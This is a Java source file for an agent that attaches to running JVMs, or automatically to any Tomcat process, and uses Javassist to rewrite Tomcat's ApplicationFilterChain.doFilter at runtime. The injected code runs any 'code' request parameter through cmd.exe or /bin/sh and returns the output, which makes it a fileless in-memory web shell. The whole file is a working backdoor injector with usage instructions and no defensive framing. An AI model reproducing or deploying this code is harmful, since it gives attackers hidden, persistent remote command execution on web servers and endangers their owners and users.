package com.demo.agent;

import com.sun.tools.attach.VirtualMachine;
import com.sun.tools.attach.VirtualMachineDescriptor;
import javassist.*;

import java.io.File;
import java.io.IOException;
import java.io.UnsupportedEncodingException;
import java.lang.instrument.ClassDefinition;
import java.lang.instrument.Instrumentation;
import java.net.URLDecoder;
import java.util.List;

public class Main {

    public static void main(String[] args) throws Throwable{
        if (args.length == 0){
            help();
            return;
        }
        Class.forName("sun.tools.attach.HotSpotAttachProvider");
        String option = args[0].trim();
        if ("list".equals(option)){
            List<VirtualMachineDescriptor> vms = VirtualMachine.list();
            System.out.println("vm count: " + vms.size());
            for (int i = 0; i < vms.size(); i++) {
                VirtualMachineDescriptor vm = vms.get(i);
                System.out.println(String.format("pid: %s displayName:%s",vm.id(),vm.displayName()));
            }
        }if ("tomcat".equals(option)){
            List<VirtualMachineDescriptor> vms = VirtualMachine.list();
            System.out.println("find tomcat pid");
            for (int i = 0; i < vms.size(); i++) {
                VirtualMachineDescriptor vm = vms.get(i);
                //System.out.println(String.format("pid: %s displayName:%s",vm.id(),vm.displayName()));
                if (vm.displayName().contains("org.apache.catalina.startup.Bootstrap")){
                    System.out.println("tomcat pid "+vm.id());
                    VirtualMachine virtualMachine = VirtualMachine.attach(vm.id());
                    virtualMachine.loadAgent(getJarFileByClass(Main.class));
                    System.out.println("inject ok!");
                    virtualMachine.detach();
                }
            }
        }else {
            //String targetPid = args[0];
            VirtualMachine virtualMachine = VirtualMachine.attach(option);
            virtualMachine.loadAgent(getJarFileByClass(Main.class));
            System.out.println("inject ok!");
            virtualMachine.detach();
        }
    }

    public static void agentmain(String agentArg, Instrumentation inst) throws IOException {

        //注册Transformer，配合inst#retransformClasses使用
        //inst.addTransformer(new DefineTransformer(),true);
       // inst.addTransformer(new DefineTransformer(),true);

        System.out.println("agentmain");
        String className = "org.apache.catalina.core.ApplicationFilterChain";

        Class[] classes  = inst.getAllLoadedClasses();
        for (int i = 0; i < classes.length; i++) {
            Class clazz = classes[i];
            try {
                //System.out.println(clazz.getName());
                if (className.equals(clazz.getName())){
                    System.out.println("Find the Inject Class: " + className);
                    ClassPool classPool = new ClassPool(true);
                    classPool.insertClassPath(new ClassClassPath(clazz));
                    classPool.insertClassPath(new LoaderClassPath(clazz.getClassLoader()));
                    CtClass ctClass = classPool.get(clazz.getName());
                    CtMethod m = ctClass.getDeclaredMethod("doFilter");
                    System.out.println(m);
                    //在方法开头插入
                    m.insertBefore("    javax.servlet.http.HttpServletRequest req =  request; \n" +
                            "               javax.servlet.http.HttpServletResponse res = response;  \n   " +
                            "               String arg0 = req.getParameter(\"code\");\n" +
                            "            java.io.PrintWriter writer = res.getWriter();\n" +
                            "            if (arg0 != null) {\n" +
                            "                String o = \"\";\n" +
                            "                java.lang.ProcessBuilder p;\n" +
                            "                if(System.getProperty(\"os.name\").toLowerCase().contains(\"win\")){\n" +
                            "                    p = new java.lang.ProcessBuilder(new String[]{\"cmd.exe\", \"/c\", arg0});\n" +
                            "                }else{\n" +
                            "                    p = new java.lang.ProcessBuilder(new String[]{\"/bin/sh\", \"-c\", arg0});\n" +
                            "                }\n" +
                            "                java.util.Scanner c = new java.util.Scanner(p.start().getInputStream()).useDelimiter(\"\\\\A\");\n" +
                            "                o = c.hasNext() ? c.next(): o;\n" +
                            "                c.close();\n" +
                            "                writer.write(o);\n" +
                            "                writer.flush();\n" +
                            "                writer.close();\n" +
                            "            }");
                    //System.out.println("insertBefore ok!");
                    //ctClass.writeFile("D:\\dev\\tomcat\\apache-tomcat-9.0.60\\bin\\");
                    inst.redefineClasses(new ClassDefinition(clazz,ctClass.toBytecode()));
                    //inst.retransformClasses(clazz);
                    ctClass.detach();
                }
            }catch (Throwable e){
                e.printStackTrace();
            }


        }
    }

    public static void help(){
        System.out.println("java -jar agent.jar list\n" +
                "java -jar agent.jar targetPid\n" +
                "java -jar agent.jar tomcat\n");
    }
    public static String getJarFileByClass(Class cs) {
        String fileString=null;
        String tmpString;
        if (cs!=null) {
            tmpString=cs.getProtectionDomain().getCodeSource().getLocation().getFile();
            if (tmpString.endsWith(".jar")) {
                try {
                    fileString= URLDecoder.decode(tmpString,"utf-8");
                } catch (UnsupportedEncodingException e) {
                    fileString=URLDecoder.decode(tmpString);
                }
            }
        }
        return new File(fileString).toString();
    }


}
